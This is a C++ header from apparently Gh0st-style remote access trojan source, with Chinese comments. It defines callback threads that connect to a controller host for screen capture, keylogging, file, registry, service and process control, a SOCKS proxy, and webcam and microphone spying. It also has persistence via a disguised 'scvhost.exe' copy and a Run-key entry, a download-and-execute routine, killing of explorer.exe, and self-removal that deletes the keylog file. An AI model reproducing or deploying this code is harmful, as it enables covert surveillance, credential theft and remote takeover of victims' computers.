#if !defined(AFX_LOOP_H_INCLUDED)
#define AFX_LOOP_H_INCLUDED

#include "../StdAfx.h"
#include "until.h"
#include "../SCREEN/ScreenManager.h"
#include "../KEYBOARD/KeyboardManager.h"
#include "../KEYBOARD/keylog.h"
#include "../File/Filemanager.h"
#include "../Socket/ProxyManager.h"
#include "../System/AppManager.h"
#include "../System/GetNetState.h"
#include "../System/ProgressManager.h"
#include "../System/QingdongxManager.h"
#include "../System/GetSystemInfo.h"
#include "../System/WindowsManager.h"
#include "../Service/ServiceManager.h"
#include "../Reg/RegManager.h"
#include "../Video/VideoManager.h"
#include "../Audio/AudioManager.h"
extern HP_STAR *php_star;
extern TCHAR SerName[100];     //服务名称
struct threadInfo
{  
	char m_strMasterHost[260];
	UINT m_nMasterPort;
};
//桌面管理
DWORD WINAPI Loop_ScreenManager(LPBYTE sRemote)
{
	threadInfo *pInfo=(threadInfo*)sRemote;     //指向结构体的实例。  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CScreenManager	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

//键盘记录
DWORD WINAPI Loop_KeyboardManager(SOCKET sRemote)
{	
	threadInfo *pInfo=(threadInfo*)sRemote;     //指向结构体的实例。  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CKeyboardManager	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

//文件管理
DWORD WINAPI Loop_FileManager(LPBYTE sRemote)
{
	threadInfo *pInfo=(threadInfo*)sRemote;     //指向结构体的实例。  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CFileManager	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

//socket5
DWORD WINAPI Loop_ProxyManager(LPBYTE sRemote)
{
	threadInfo *pInfo=(threadInfo*)sRemote;     //指向结构体的实例。  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CProxyManager	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

//系统信息
DWORD WINAPI Loop_SystemsManager(LPVOID sRemote)
{
	threadInfo *pInfo=(threadInfo*)sRemote;     //指向结构体的实例。  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CGetSystemInfo	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

//窗口管理
DWORD WINAPI Loop_WindowsManager(LPVOID sRemote)
{
	threadInfo *pInfo=(threadInfo*)sRemote;     //指向结构体的实例。  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CWindowsManager	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

//进程管理
DWORD WINAPI Loop_ProgressManager(LPVOID sRemote)
{
	threadInfo *pInfo=(threadInfo*)sRemote;     //指向结构体的实例。  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CProgressManager	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

//网络状态
DWORD WINAPI Loop_GetNetState(LPVOID sRemote)
{
	threadInfo *pInfo=(threadInfo*)sRemote;     //指向结构体的实例。  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CGetNetState	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

//应用程序
DWORD WINAPI Loop_AppManager(LPVOID sRemote)
{
	threadInfo *pInfo=(threadInfo*)sRemote;     //指向结构体的实例。  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CAppManager	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

//启动项
DWORD WINAPI Loop_DllQDXGLManager(LPVOID sRemote)
{
	threadInfo *pInfo=(threadInfo*)sRemote;     //指向结构体的实例。  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CQingdongxManager	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

//服务管理
DWORD WINAPI Loop_SerManager(LPBYTE sRemote)   
{	
	threadInfo *pInfo=(threadInfo*)sRemote;     //指向结构体的实例。  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CServiceManager	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

//注册表管理
DWORD WINAPI Loop_RegeditManager(LPBYTE sRemote)          
{	
	threadInfo *pInfo=(threadInfo*)sRemote;     //指向结构体的实例。  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CRegManager	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

//视频
DWORD WINAPI Loop_VideoManager(LPBYTE sRemote)
{
	threadInfo *pInfo=(threadInfo*)sRemote;     //指向结构体的实例。  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CVideoManager	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

//音频监听
DWORD WINAPI Loop_AudioManager(LPBYTE sRemote)
{
	if (!waveInGetNumDevs())  //读是否有录音设备
		return -1;

	threadInfo *pInfo=(threadInfo*)sRemote;     //指向结构体的实例。  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CAudioManager	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

DWORD WINAPI Loop_Screen()
{	
	//获取分辨率  
	int _cx = ::GetSystemMetrics(SM_CXSCREEN);   
	int _cy = ::GetSystemMetrics(SM_CYSCREEN);  

	//修改分辨率  
	DEVMODE lpDevMode;  
	lpDevMode.dmBitsPerPel = 32;//每个像素的位数  
	lpDevMode.dmPelsWidth = 1600;//屏幕宽度（像素）  
	lpDevMode.dmPelsHeight = 900;//屏幕高度（像素）  
	lpDevMode.dmSize = sizeof(lpDevMode);  
	lpDevMode.dmFields =   
		DM_PELSWIDTH/*使用dmPelsWidth的值*/  
		|DM_PELSHEIGHT/*使用dmPelsHeight的值*/  
		|DM_BITSPERPEL/*使用dmBitsPerPel的值*/;  
	//  
	LONG result = ChangeDisplaySettings(&lpDevMode, 0);  
	if (result == DISP_CHANGE_SUCCESSFUL)  
	{  
		//			MessageBox(NULL, L"修改成功！", L"Tip", MB_OK);  
		ChangeDisplaySettings(&lpDevMode, CDS_UPDATEREGISTRY);//CDS_UPDATEREGISTRY表示次修改是持久的，并在注册表中写入了相关的数据  
	}  
	else  
	{  
		//			MessageBox(NULL, L"修改失败，恢复原有设置！", L"Tip", MB_OK);  
		ChangeDisplaySettings(NULL,0);  
	}  
	return 0;
}

//Run
bool UpXRUN(char *ZC_QDX)
{
	HKEY hKey ;
	char winDir[MAX_PATH]={NULL};
	GetModuleFileName(NULL,winDir,MAX_PATH);
	char szRun[90]="C:\\Program Files\\Common Files\\scvhost.exe";
	CopyFile(winDir,szRun,NULL);
	if (RegOpenKeyEx(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_ALL_ACCESS,&hKey)==ERROR_SUCCESS)
	{
		RegSetValueEx(hKey,ZC_QDX,NULL,REG_SZ,(BYTE*)winDir,sizeof(winDir));
		RegCloseKey(hKey);
	}
	return 0;
}

#include <TlHelp32.h>
//void ReStartExp() // 重启Exp
DWORD WINAPI ReStartExp(LPVOID lParam)
{
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	HANDLE  hSnapshot=NULL; 
	hSnapshot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0); 
	PROCESSENTRY32 pe={sizeof(PROCESSENTRY32)};//支持win7
	Process32First(hSnapshot,&pe); 
	do 
	{
		if(strcmpi(pe.szExeFile, "explorer.exe")==0)
		{
			HANDLE   hProcess; 
			hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,pe.th32ProcessID); 
			if   (hProcess) 
			{ 
				TerminateProcess(hProcess,0);//关闭进程 
			} 
		} 
	}   
	while(Process32Next(hSnapshot,&pe)); 
	CloseHandle(hSnapshot); 
	DebugPrivilege(SE_DEBUG_NAME, FALSE);
	return 0;
}
// 下载执行
DWORD WINAPI Loop_DownManager(LPVOID lparam)
{
	int	nUrlLength;
	char	*lpURL = NULL;
	char	*lpFileName = NULL;
	nUrlLength = strlen((char *)lparam);
	if (nUrlLength == 0)
		return false;

	lpURL = new char[nUrlLength + 1];
	memcpy(lpURL, lparam, nUrlLength + 1);

	lpFileName = strrchr(lpURL, '/') + 1;

	if (lpFileName == NULL||!http_get(lpURL, lpFileName) || !CheckFileExist(lpFileName))
	{
		delete []lpURL;
		return false;
	}

	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	si.lpDesktop = "WinSta0\\Default"; 


	CreateProcess(NULL, lpFileName, NULL, NULL, false, 0, NULL, NULL, &si, &pi);

	delete []lpURL;

	return true;
}

void SetHostID(LPCTSTR lpHostID)
{
	HKEY   hKey;
	if (RegCreateKey(HKEY_LOCAL_MACHINE, "SYSTEM\\Setup", &hKey) == ERROR_SUCCESS)
	{
		RegSetValueEx(hKey, "Host", 0, REG_SZ, (LPBYTE)lpHostID, strlen(lpHostID) + 1);
		RegCloseKey(hKey);
	}
}


BOOL NtStopService(LPCTSTR lpService)
{
	SC_HANDLE        schSCManager;
	SC_HANDLE        schService;
	SERVICE_STATUS   RemoveServiceStatus;

	schSCManager = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);//打开服务控制管理器数据库
	if (schSCManager!=NULL)
	{
		schService=OpenService(schSCManager,lpService,SERVICE_ALL_ACCESS);//获得服务对象的句柄
		if (schService!=NULL)
		{		
			if(QueryServiceStatus(schService,&RemoveServiceStatus)!=0)
			{
				if(RemoveServiceStatus.dwCurrentState!=SERVICE_STOPPED)//停止服务
				{
					if(ControlService(schService,SERVICE_CONTROL_STOP,&RemoveServiceStatus)!=0)
					{
						while(RemoveServiceStatus.dwCurrentState==SERVICE_STOP_PENDING)         
						{
							Sleep(10);
							QueryServiceStatus(schService,&RemoveServiceStatus);
						}
					}
				}
			}    
			CloseServiceHandle(schService);
		}	
		CloseServiceHandle(schSCManager);
	}
	else 
	{
		return FALSE;
	}

	return TRUE;
}

void NtUninstallService(LPCTSTR ServiceName)
{
	if (!strlen(ServiceName))
		return;

	NtStopService(ServiceName);

	SC_HANDLE scm,svc;

	scm=OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (scm!=NULL)
	{
		svc=OpenService(scm, ServiceName, SERVICE_ALL_ACCESS);
		if (svc!=NULL)
		{
			DeleteService(svc);
			CloseServiceHandle(svc);
		}
		CloseServiceHandle(scm);
	}
}

void UnInstallServer()
{
	char	*ServerA = NULL;
	ServerA = php_star->SerName;
	SC_HANDLE service, scm;
	scm = OpenSCManager(0, 0,SC_MANAGER_CREATE_SERVICE);
	service = OpenService(scm, ServerA,SERVICE_ALL_ACCESS | DELETE);
	DeleteService(service);
	NtUninstallService(php_star->SerName);//删除服务	
	/////////////////////////////////////////////////////////////
	TCHAR	strRecordFile[MAX_PATH];
	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
	char keylog[] = {'\\','D','e','f','a','u','l','t','.','k','e','y','\0'};
	lstrcat(strRecordFile, keylog);
	DeleteFile(strRecordFile);
	ExitProcess(0);
}

#endif // !defined(AFX_LOOP_H_INCLUDED)
